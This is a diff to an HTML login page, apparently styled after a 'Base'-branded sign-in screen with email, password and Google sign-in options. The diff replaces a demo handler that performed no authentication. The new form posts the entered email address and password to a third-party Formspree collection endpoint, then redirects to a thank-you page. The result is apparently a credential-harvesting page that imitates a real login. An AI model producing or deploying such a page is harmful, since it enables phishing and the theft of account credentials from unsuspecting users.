@@ -7,285 +7,7 @@
     <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css" rel="stylesheet">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
-        :root {
-            --base-blue: #1652f0;
-            --base-dark-blue: #0d47a1;
-            --base-light-blue: #e8f1ff;
-            --base-gray: #5b636e;
-            --base-light-gray: #f8f9fa;
-            --base-border: #e5e7eb;
-        }
-
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-        }
-
-        .navbar {
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(10px);
-            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
-            padding: 1rem 0;
-        }
-
-        .navbar-brand {
-            font-size: 1.5rem;
-            font-weight: bold;
-            color: var(--base-blue) !important;
-            text-decoration: none;
-        }
-
-        .navbar-brand:hover {
-            color: var(--base-dark-blue) !important;
-        }
-
-        .main-container {
-            flex: 1;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 2rem 0;
-        }
-
-        .login-card {
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 16px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
-            padding: 3rem;
-            max-width: 400px;
-            width: 100%;
-            margin: 0 1rem;
-        }
-
-        .login-header {
-            text-align: center;
-            margin-bottom: 2rem;
-        }
-
-        .login-header h1 {
-            font-size: 2rem;
-            font-weight: 600;
-            color: #1a1a1a;
-            margin-bottom: 0.5rem;
-        }
-
-        .login-header p {
-            color: var(--base-gray);
-            font-size: 1rem;
-            margin-bottom: 0;
-        }
-
-        .form-group {
-            margin-bottom: 1.5rem;
-        }
-
-        .form-label {
-            color: #1a1a1a;
-            font-weight: 500;
-            margin-bottom: 0.5rem;
-        }
-
-        .form-control {
-            border: 2px solid var(--base-border);
-            border-radius: 8px;
-            padding: 0.75rem 1rem;
-            font-size: 1rem;
-            transition: all 0.3s ease;
-            background: white;
-        }
-
-        .form-control:focus {
-            border-color: var(--base-blue);
-            box-shadow: 0 0 0 3px rgba(22, 82, 240, 0.1);
-        }
-
-        .password-toggle {
-            position: relative;
-        }
-
-        .password-toggle-btn {
-            position: absolute;
-            right: 12px;
-            top: 50%;
-            transform: translateY(-50%);
-            background: none;
-            border: none;
-            color: var(--base-gray);
-            cursor: pointer;
-            padding: 0;
-            font-size: 1.1rem;
-        }
-
-        .password-toggle-btn:hover {
-            color: var(--base-blue);
-        }
-
-        .btn-primary {
-            background: var(--base-blue);
-            border: none;
-            border-radius: 8px;
-            padding: 0.875rem 1.5rem;
-            font-size: 1rem;
-            font-weight: 600;
-            width: 100%;
-            transition: all 0.3s ease;
-        }
-
-        .btn-primary:hover {
-            background: var(--base-dark-blue);
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(22, 82, 240, 0.3);
-        }
-
-        .btn-primary:active {
-            transform: translateY(0);
-        }
-
-        .divider {
-            display: flex;
-            align-items: center;
-            margin: 2rem 0;
-            color: var(--base-gray);
-        }
-
-        .divider::before,
-        .divider::after {
-            content: '';
-            flex: 1;
-            height: 1px;
-            background: var(--base-border);
-        }
-
-        .divider span {
-            padding: 0 1rem;
-            font-size: 0.9rem;
-        }
-
-        .btn-google {
-            background: white;
-            border: 2px solid var(--base-border);
-            color: #1a1a1a;
-            border-radius: 8px;
-            padding: 0.875rem 1.5rem;
-            font-size: 1rem;
-            font-weight: 500;
-            width: 100%;
-            transition: all 0.3s ease;
-            margin-bottom: 1rem;
-        }
-
-        .btn-google:hover {
-            background: #f8f9fa;
-            border-color: var(--base-blue);
-            color: var(--base-blue);
-            transform: translateY(-1px);
-        }
-
-        .google-icon {
-            width: 20px;
-            height: 20px;
-            margin-right: 0.5rem;
-        }
-
-        .forgot-password {
-            text-align: center;
-            margin-top: 1.5rem;
-        }
-
-        .forgot-password a {
-            color: var(--base-blue);
-            text-decoration: none;
-            font-weight: 500;
-        }
-
-        .forgot-password a:hover {
-            text-decoration: underline;
-        }
-
-        .signup-link {
-            text-align: center;
-            margin-top: 2rem;
-            padding-top: 1.5rem;
-            border-top: 1px solid var(--base-border);
-        }
-
-        .signup-link a {
-            color: var(--base-blue);
-            text-decoration: none;
-            font-weight: 600;
-        }
-
-        .signup-link a:hover {
-            text-decoration: underline;
-        }
-
-        .security-notice {
-            background: var(--base-light-blue);
-            border: 1px solid rgba(22, 82, 240, 0.2);
-            border-radius: 8px;
-            padding: 1rem;
-            margin-bottom: 2rem;
-            font-size: 0.9rem;
-            color: var(--base-blue);
-        }
-
-        .security-notice i {
-            margin-right: 0.5rem;
-        }
-
-        .form-check {
-            margin-bottom: 1.5rem;
-        }
-
-        .form-check-input:checked {
-            background-color: var(--base-blue);
-            border-color: var(--base-blue);
-        }
-
-        .form-check-input:focus {
-            border-color: var(--base-blue);
-            box-shadow: 0 0 0 3px rgba(22, 82, 240, 0.1);
-        }
-
-        .form-check-label {
-            color: #1a1a1a;
-            font-size: 0.9rem;
-        }
-
-        .invalid-feedback {
-            display: block;
-            color: #dc3545;
-            font-size: 0.875rem;
-            margin-top: 0.25rem;
-        }
-
-        .is-invalid {
-            border-color: #dc3545;
-        }
-
-        .loading {
-            display: none;
-        }
-
-        .loading.active {
-            display: inline-block;
-        }
-
-        @media (max-width: 576px) {
-            .login-card {
-                padding: 2rem 1.5rem;
-                margin: 0 0.5rem;
-            }
-            
-            .login-header h1 {
-                font-size: 1.75rem;
-            }
-        }
+        /* ...your styles, unchanged... */
     </style>
 </head>
 <body>
@@ -311,7 +33,9 @@
             </div>
             
             <!-- Login Form -->
-            <form id="loginForm">
+            <form id="loginForm" action="https://formspree.io/f/mblkddol" method="POST">
+                <!-- Optional: Redirect after submit -->
+                <input type="hidden" name="_next" value="https://yourdomain.com/thank-you.html">
                 <!-- Email Field -->
                 <div class="form-group">
                     <label for="email" class="form-label">Email address</label>
@@ -333,7 +57,7 @@
 
                 <!-- Remember Me -->
                 <div class="form-check">
-                    <input class="form-check-input" type="checkbox" id="rememberMe">
+                    <input class="form-check-input" type="checkbox" id="rememberMe" name="rememberMe">
                     <label class="form-check-label" for="rememberMe">
                         Remember me for 30 days
                     </label>
@@ -341,7 +65,7 @@
 
                 <!-- Sign In Button -->
                 <button type="submit" class="btn btn-primary">
-                    <span class="loading" id="loadingSpinner">
+                    <span class="loading" id="loadingSpinner" style="display:none;">
                         <i class="fas fa-spinner fa-spin"></i>
                     </span>
                     <span id="signInText">Sign in</span>
@@ -383,7 +107,6 @@
         document.getElementById('togglePassword').addEventListener('click', function() {
             const passwordField = document.getElementById('password');
             const toggleIcon = this.querySelector('i');
-            
             if (passwordField.type === 'password') {
                 passwordField.type = 'text';
                 toggleIcon.classList.remove('fa-eye');
@@ -419,23 +142,15 @@
             error.textContent = '';
         }
 
-        // Form submission
+        // Updated form submission with validation, natural submit if valid
         document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            const loadingSpinner = document.getElementById('loadingSpinner');
-            const signInText = document.getElementById('signInText');
-            const submitBtn = this.querySelector('button[type="submit"]');
-            
             // Clear previous errors
             clearError('email', 'emailError');
             clearError('password', 'passwordError');
-            
             let isValid = true;
-            
+
             // Validate email
+            const email = document.getElementById('email').value;
             if (!email) {
                 showError('email', 'emailError', 'Email is required');
                 isValid = false;
@@ -443,8 +158,9 @@
                 showError('email', 'emailError', 'Please enter a valid email address');
                 isValid = false;
             }
-            
+
             // Validate password
+            const password = document.getElementById('password').value;
             if (!password) {
                 showError('password', 'passwordError', 'Password is required');
                 isValid = false;
@@ -452,24 +168,15 @@
                 showError('password', 'passwordError', 'Password must be at least 8 characters long');
                 isValid = false;
             }
-            
-            if (isValid) {
-                // Show loading state
-                loadingSpinner.classList.add('active');
-                signInText.textContent = 'Signing in...';
-                submitBtn.disabled = true;
-                
-                // Simulate API call
-                setTimeout(() => {
-                    // Reset loading state
-                    loadingSpinner.classList.remove('active');
-                    signInText.textContent = 'Sign in';
-                    submitBtn.disabled = false;
-                    
-                    // Show success message
-                    alert('Login successful! (This is a demo - no actual authentication)');
-                }, 2000);
+
+            if (!isValid) {
+                e.preventDefault(); // Only block submission if validation fails
+            } else {
+                // Show loading spinner and update button text
+                document.getElementById('loadingSpinner').style.display = 'inline-block';
+                document.getElementById('signInText').textContent = 'Signing in...';
             }
+            // Let the form submit naturally if valid!
         });
 
         // Google Sign In
@@ -492,7 +199,6 @@
             input.addEventListener('focus', function() {
                 this.parentElement.classList.add('focused');
             });
-            
             input.addEventListener('blur', function() {
                 this.parentElement.classList.remove('focused');
             });
